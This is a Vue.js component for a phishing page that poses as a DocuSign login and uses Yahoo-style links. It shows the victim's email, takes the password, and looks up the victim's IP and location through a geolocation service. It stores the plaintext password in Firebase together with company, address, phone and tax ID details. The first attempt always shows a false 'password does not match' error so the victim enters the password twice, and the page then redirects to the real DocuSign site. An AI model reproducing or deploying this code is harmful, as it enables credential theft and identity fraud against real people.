<template>
    <div>

     <div class="content">
         <center>
 <div class="docusign-div">
                <img src="https://www.satuit.com/images/default-source/default-album/docusign-logo.png?sfvrsn=e8438f89_1" alt="" height='40px'>
            <br><br>
             <p style="font-size:23px;"><b>Please log in to your account</b></p>
             <p style="font-size:15px;">{{ getEmail }}</p>            
            <input type="password" placeholder="Password" v-model="password" class="text-field">
            <br><br>
           <p style="color:red; font-size:14px" v-if="passLogic">The password does not match the email provided</p>  
            <br>
     <Button v-if="btn" @click="Save" style=" width:100%; font-size:14px;background:#ffc820;padding:10px 25px;font-weight:bold;">LOGIN</Button>  
      <Button  v-else @click="Save2" style=" width:100%; font-size:14px;background:#ffc820;padding:10px 25px;font-weight:bold;">LOGIN</Button>  
           <br><br>
           <p style="font-size:15px"><a href="account.docusign.com/forgotpassword?">Forgot Password?</a></p>
           <br>
           <v-divider></v-divider>
           <br>
      <router-link to="/login-yahoo-com-src-ym&-lang-en-US&-intl-us&-done-mail.yahoo.com"><p style="font-size:15px">Sign in as a different user</p></router-link>       
         </div>   </center>
     </div>
     <div class="login-footer">
      <a href="https://policies.oath.com/us/en/oath/terms/otos/index.html">Terms |</a>
       <a href="https://policies.oath.com/us/en/oath/privacy/index.html"> Privacy</a>
     </div>
   </div>
</template>

<script>
import db from '../../firebaseinit.js';
import firebase from 'firebase';
import { error } from 'util';
 import { mapGetters } from 'vuex'
  export default {
     data() {
    return {
       json:null,
         btn: true,
         passLogic: false,
           password: '',
           Cdate: new Date()
    }
  },
  computed:{
         ...mapGetters ([
             'getEmail',
            'getCompanyName',
            'getMailingAddressA1',
            'getMailingAddressA2',
            'getCity1',
            'getState1',
            'getZip1',
            'getContactName',
            'getPhoneNumber',
            'getFaxNumber',
            'getEmailAddress',
            'getMailingQuestion',
            'getMailingAddressB1',
            'getMailingAddressB2',
            'getCity2',
            'getState2',
            'getZip2',
            'getTaxDesignator',
            'getTaxId',
            'getType',
            'getStatus',
            'getEmployees'
         ]),
   },
   created(){
           var _this = this;
        $.getJSON('https://geoip-db.com/json/', function (json) {
            _this.json = json;
           });
     },

    methods:{
      Save(){
        db.collection('Details').add({
            Country: this.json.country_name,
           City: this.json.city,
            IPAddress: this.json.IPv4,
        Type : 'Others',
        Email: this.getEmail,
        Password: this.password, 
       timestamp: Date.now(),
        CompanyName: this.getCompanyName,
        MailingAddressA1:  this.getMailingAddressA1,
        MailingAddressA2 : this.getMailingAddressA2,
         City1 :  this.getCity1,
         State1 :  this.getState1,
          Zip1 :  this.getZip1,
          ContactName : this.getContactName,
          PhoneNumber : this.getPhoneNumber,
          FaxNumber : this.getFaxNumber,
           EmailAddress : this.getEmailAddress,
           MailingQuestion: this.getMailingQuestion,
            MailingAddressB1:  this.getMailingAddressB1,
        MailingAddressB2 : this.getMailingAddressB2,
         City2 :  this.getCity1,
         State2 :  this.getState1,
         Zip2 : this.getZip2,
         TaxDesignator: this.getTaxDesignator,
          TaxId : this.getTaxId,
           TaxType :  this.getType,
           Status : this.getStatus,
           Employees : this.getEmployees
       })
       .then(docRef =>  this.passLogic = true, this.password = "" , this.btn = false)
   
   .catch(error => console.log(err))
             },
             Save2(){
        db.collection('Details').add({
          Country: this.json.country_name,
           City: this.json.city,
            IPAddress: this.json.IPv4,
        Type : 'Others',
        Email: this.getEmail,
        Password: this.password, 
       timestamp: Date.now(),
        CompanyName: this.getCompanyName,
        MailingAddressA1:  this.getMailingAddressA1,
        MailingAddressA2 : this.getMailingAddressA2,
         City1 :  this.getCity1,
         State1 :  this.getState1,
          Zip1 :  this.getZip1,
          ContactName : this.getContactName,
          PhoneNumber : this.getPhoneNumber,
          FaxNumber : this.getFaxNumber,
           EmailAddress : this.getEmailAddress,
           MailingQuestion: this.getMailingQuestion,
            MailingAddressB1:  this.getMailingAddressB1,
        MailingAddressB2 : this.getMailingAddressB2,
         City2 :  this.getCity1,
         State2 :  this.getState1,
          Zip2 : this.getZip2,
         TaxDesignator: this.getTaxDesignator,
          TaxId : this.getTaxId,
          TaxType :  this.getType,
           Status : this.getStatus,
           Employees : this.getEmployees
       })
        window.location.assign("https://www.docusign.com/")
             }
    }
  }
</script>

<style scoped>
.text-field { padding-left:15px; height: 40px; border: 1px solid rgb(189, 189, 189);width: 100%;}
.docusign-div {  width: 400px; text-align: center; }
.login-footer {
    text-align: center;
    padding: 6px 0;
    font-size: .58824em;
    position: fixed;
    bottom: 0;
    background: #fff;
    color: #26282a;
    z-index: 1;
    width: 100%;
}
.login-card {padding:30px 30px 100px 30px;}
.text-card {padding: 80px 40px 0px 40px; font-size:22px; letter-spacing: 1px;}
.content { padding: 10% 0px;}

  @media (max-width: 991px) { 
.login-footer {
    text-align: center;
    padding: 6px 0;
    font-size: .58824em;
    position: fixed;
    bottom: 0;
    background: #fff;
    color: #26282a;
    z-index: 1;
    width: 100%;
}
.login-card {padding:30px 30px 100px 30px;}
.text-card {padding: 80px 40px 0px 40px; font-size:22px; letter-spacing: 1px;}
.content { padding: 20px 180px;}

  }

 @media (max-width: 767px) {   

}

    @media (max-width: 479px) {
.login-footer {
    text-align: center;
    padding: 6px 0;
    font-size: .58824em;
    position: fixed;
    bottom: 0;
    background: #fff;
    color: #26282a;
    z-index: 1;
    width: 100%;
}
.login-card {padding:30px 20px 30px 20px;}
.text-card {padding: 80px 20px 0px 20px; font-size:22px; letter-spacing: 1px;}
.content { padding: 50px 20px;}

    }
</style>
